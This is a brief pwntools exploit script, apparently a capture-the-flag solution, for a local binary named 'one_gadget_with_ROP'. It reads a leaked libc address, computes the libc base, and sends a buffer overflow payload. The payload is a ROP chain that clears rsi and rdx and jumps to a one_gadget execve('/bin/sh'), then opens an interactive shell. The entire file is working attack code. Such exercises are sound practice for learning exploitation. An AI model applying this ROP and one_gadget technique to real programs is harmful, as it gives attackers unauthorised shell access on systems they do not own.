from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./one_gadget_with_ROP')

r.recvuntil(b': ')

libc = int(r.recv(14), 16) - 0x000000000061c90
info(f'libc : {hex(libc)}')

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
pop_rsi_ret = libc + 0x000000000002601f
pop_rdx_ret = libc + 0x0000000000142c92
one_gad = libc + 0xe3b04

r.sendline(b'a' * 0x18 + flat(pop_rsi_ret, 0, pop_rdx_ret, 0, one_gad))

r.interactive()